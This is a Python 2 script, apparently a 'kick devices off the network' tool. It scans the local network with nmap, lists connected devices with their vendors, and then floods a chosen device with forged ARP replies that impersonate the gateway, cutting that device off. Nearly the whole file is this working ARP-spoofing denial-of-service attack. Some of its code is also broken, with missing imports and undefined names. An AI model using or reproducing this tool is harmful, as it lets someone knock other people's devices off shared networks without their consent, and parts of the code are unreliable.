from scapy.all import *
import os, sys
import traceback
from time import sleep
import urllib2 as urllib
import spoof
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

#The function returns your current working interface (wlan or wifi)
def getDefaultInterface(returnNet=False):
    def long2net(arg):
        if(arg <= 0 or arg >= 0xFFFFFFFF):
            raise ValueError("Illegal Netmask Value", hex(arg))
        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))
    def to_CIDR_notation(bytes_network, bytes_netmask):
        network = scapy.utils.ltoa(bytes_network)
        netmask = long2net(bytes_netmask)
        net = "%s/%s" %(network, netmask)
        if netmask < 16:
            return None
        return net

    iface_routes = [route for route in scapy.config.conf.route.routes if route[3] == scapy.config.conf.iface and route[1] != 0xFFFFFFFF]
    #print(iface_routes)
    network, netmask, _, interface, address,metric = max(iface_routes, key=lambda item:item[1])
    net = to_CIDR_notation(network, netmask)
    if net:
        if returnNet:
            return net
        else:
            return interface

#This returns your MAC address
def getDefaultInterfaceMAC():
    try:
        defaultInterfaceMac = get_if_hwaddr(defaultInterface)
        if defaultInterfaceMac == "" or not defaultInterfaceMac:
            print("Error")
            defaultInterfaceMac = raw_input(header)
            return defaultInterfaceMac
        else:
            return defaultInterfaceMac
    except:
        print("Ex. Error")

#This returns your Gateway IP
def getGatewayIP():
    try:
        getGateway_p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False) #sr()-for sending and receiving packets
        return getGateway_p.src
    except:
        # request gateway IP address (after failed detection by scapy)
        print("\n{0}ERROR: Gateway IP could not be obtained. Please enter IP manually.{1}\n").format(RED, END)
        header = ('{0}Scanner {1}> {2}Enter Gateway IP {3}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
        gatewayIP = raw_input(header)
        return gatewayIP

#Uses API to fingerprint your device using MAC address
def resolveMac(mac):
    try:
        url = "https://macvendors.co/api/vendorname/"
        request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urllib.urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]
        return vendor
    except:
        return "N/A"

#Scans the network, in given interface, to generate list of live IPs
def scanNetwork(network):
    returnList = []
    import nmap
    nm = nmap.PortScanner()
    a = nm.scan(hosts=network, arguments='-sP')
    #print(a)
    for k, v in a['scan'].iteritems():
        if str(v['status']['state']) == 'up':
            try:
            	#print(k,v)
                returnList.append([str(v['addresses']['ipv4']), str(v['addresses']['mac'])])
            except:
                pass

    return returnList

def getNodes():
    global nodelist
    try:
        nodelist = scanNetwork(getDefaultInterface(True))
        #print('nodes ********************',nodelist)
    except KeyboardInterrupt:
        printf("Terminated.")
    except:
        print("Error.")
    generateIPs()

#Create list of IPs that were found live
def generateIPs():
    global liveIPs
    liveIPs = []
    for host in nodelist:
        liveIPs.append(host[0])
        
def heading():	#yet to be designed
	print("{0}"+"Welcome  !!"+"{1}").format(MAGENTA,END)

	sys.stdout.write(RED + """ 
		**       **     ***     *     *     *
		**	 **    *   *    *     *     *
		***********    ******   *     *     *
		**       **    *    *   *     *     *
		**       **    *    *   ****** ******
	""" + END)

def display():
	for i in range(len(liveIPs)):
		mac = ""
	    	for host in nodelist:
			if host[0] == liveIPs[i]:
				mac = host[1]
	    	vendor = resolveMac(mac)
	   	#print(mac)
	   	print("  [{0}" + str(i) + "{1}] {2}" + str(liveIPs[i]) + "{3}\t" + mac + "{4}\t" + vendor + "{5}").format(YELLOW, WHITE, RED, BLUE, GREEN,END)
	

def disconnect():
	choice=raw_input("Choose a node to disconnect from network : ")
	target_ip = liveIPs[int(choice)]
	target_mac = nodelist[int(choice)][1]
	print('disconneting device with ip ' +target_ip+"  and mac " +target_mac)
	try:
		while True:
			sendPacket(defaultInterfaceMac,defaultGatewayIP,target_ip,target_mac)
			time.sleep(2)
	except KeyboardInterrupt:
		count =1
		while count!=10:
			sendPacket(defaultInterfaceMac,defaultGatewayIP,target_ip,target_mac)
			count += 1
			time.sleep(0.5)
		print("device disconnected!!")
		
		

def sendPacket(my_mac,gateway_ip,target_ip,target_mac):#need to be modify a bit
	ether = Ether()
	ether.src = my_mac
	
	arp=ARP()
	arp.psrc = gateway_ip
	arp.hwsrc = my_mac
	
	arp=arp
	arp.pdst = target_ip
	arp.hwdst = target_mac
	
	ether = ether
	ether.src = my_mac
	ether.dst = target_mac
	
	arp.op=2
	
	packet = ether / arp
	sendp(x=packet,verbose=False)
		
	
	
def main():
	print("{0}Scanning your network, hang on...{1}\r".format(BLUE, END))
	print("{0}Default Network Interface:{1} " + defaultInterface+'{2}').format(GREEN,RED,END)
	print("{0}Your Gateway IP: {1}" + defaultGatewayIP+'{2}').format(GREEN,RED,END)
	print("{0}Your MAC Address:{1} " + defaultInterfaceMac+'{2}').format(GREEN,RED,END)
	print("{0}Hosts up : "+str(len(nodelist))+'{2}').format(GREEN,RED,END)
	#print(nodelist) #This list contains both IP and MAC addresses
	#print("IP thinggy")
	#print(liveIPs) #This list only contains their IP addresses

	print("{0}connected devices {1}::){2}").format(YELLOW,GREEN,END)
	for i in range(len(liveIPs)):
	    mac = ""
	    for host in nodelist:
		if host[0] == liveIPs[i]:
		    mac = host[1]
	    vendor = resolveMac(mac)
	    #print(mac)
	    print("  [{0}" + str(i) + "{1}] {2}" + str(liveIPs[i]) + "{3}\t" + mac + "{4}\t" + vendor + "{5}").format(YELLOW, WHITE, RED, BLUE, GREEN,END)
	    
	try:
		while True:
			if len(nodelist) <=1 :
				print("Can't kickout")
				raise SystemExit
			else:
				disconnect()
				raise SystemExit
				
				
	except KeyboardInterrupt:
		print('error!!')
		
				
if __name__ == '__main__':

	defaultInterface = getDefaultInterface()
	defaultGatewayIP = getGatewayIP()
	defaultInterfaceMac = getDefaultInterfaceMAC()
	getNodes()
	main()
